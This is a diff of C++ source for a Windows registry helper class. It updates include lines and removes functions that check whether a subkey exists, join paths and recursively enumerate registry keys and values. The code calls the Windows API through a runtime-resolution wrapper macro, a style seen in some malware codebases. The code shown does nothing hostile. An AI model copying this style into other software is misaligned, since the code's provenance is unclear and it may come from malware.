@@ -1,10 +1,11 @@
-#include <windows.h>
-#include <Shlwapi.h>
+#include "common/rl_kernel.h"
 
-#include <common/registry.h>
-#include <common/mem.h>
+
+#include "common/registry.h"
+#include "common/mem.h"
+#include "common/crypt.h"
 #include <common/str.h>
-#include <common/crypt.h>
+
 
 void Registry::init(void)
 {
@@ -162,97 +163,4 @@ bool Registry::_valueExists(HKEY key, const LPWSTR subKey, const LPWSTR value)
     CWA(advapi32, RegCloseKey)(key);
   }
   return retVal;
-}
-
-bool Registry::_subkeyExists(HKEY key, const LPWSTR subKey)
-{
-  bool retVal = false;
-  if(CWA(advapi32, RegOpenKeyExW)(key, subKey, NULL, KEY_QUERY_VALUE, &key) == ERROR_SUCCESS)
-  {
-    retVal = true;
-    CWA(advapi32, RegCloseKey)(key);
-  }
-  return retVal;
-}
-
-static bool _pathCombine(LPWSTR dest, const LPWSTR dir, const LPWSTR file)
-{
-  LPWSTR p = (LPWSTR)file;
-  if(p != NULL)while(*p == '\\' || *p == '/')p++;
-  return CWA(shlwapi, PathCombineW)(dest, dir, p) == NULL ? false : true;
-}
-
-void Registry::_findKeys(HKEY key, LPWSTR subKey, FINDKEYSPROC findKeyProc, bool recursive)
-{
-	#define MAX_VALUE_NAME 100
-	if(findKeyProc == NULL) return;
-	DWORD retCode;
-	HKEY hKey;
-	DWORD cchValue = MAX_VALUE_NAME;
-	WCHAR achValue[MAX_VALUE_NAME]; 
-	WCHAR subKeyEnum[MAX_VALUE_NAME];
-	if(RegOpenKeyExW(key, subKey, 0, recursive ? KEY_READ | KEY_ENUMERATE_SUB_KEYS : KEY_READ, &hKey) == ERROR_SUCCESS)
-	{
-		DWORD    cValues;
-		DWORD	 cKeys;
-		retCode = RegQueryInfoKeyW(
-        hKey,                    // key handle 
-        NULL,                // buffer for class name 
-        NULL,           // size of class string 
-        NULL,                    // reserved 
-        &cKeys,               // number of subkeys 
-        NULL,            // longest subkey size 
-        NULL,            // longest class string 
-        &cValues,                // number of values for this key 
-        NULL,            // longest value name 
-        NULL,         // longest value data 
-        NULL,   // security descriptor 
-        NULL);       // last write time 
-		if(recursive && cKeys)
-		{
-			for(unsigned int i=0; i<cKeys; i++)
-			{
-				DWORD retCode1;
-				DWORD size = MAX_VALUE_NAME;
-				retCode1 = RegEnumKeyExW(
-					hKey,
-					i,
-					subKeyEnum,
-					&size,
-					0,
-					0,
-					0,
-					0);
-				if(retCode1 == ERROR_SUCCESS)
-				{
-					if(_pathCombine(subKeyEnum, subKey, subKeyEnum)) _findKeys(key, subKeyEnum, findKeyProc, recursive);
-				}
-			}
-		}
-		if (cValues) 
-		{
-			for (unsigned int i=0, retCode=ERROR_SUCCESS; i<cValues; i++) 
-			{
-				cchValue = MAX_VALUE_NAME;
-				WCHAR name[300];
-				DWORD nameSize = sizeof(name);
-				retCode = RegEnumValueW(
-					hKey, 
-					i, 
-					achValue, 
-					&cchValue, 
-					NULL, 
-					NULL,
-					(LPBYTE)name,
-					&nameSize);
-				if(retCode == ERROR_SUCCESS)
-				{
-					PathUnquoteSpacesW(name);
-					if(!findKeyProc(achValue, name)) break;
-				}
-			}
-		}
-
-		RegCloseKey(hKey);
-	}
 }
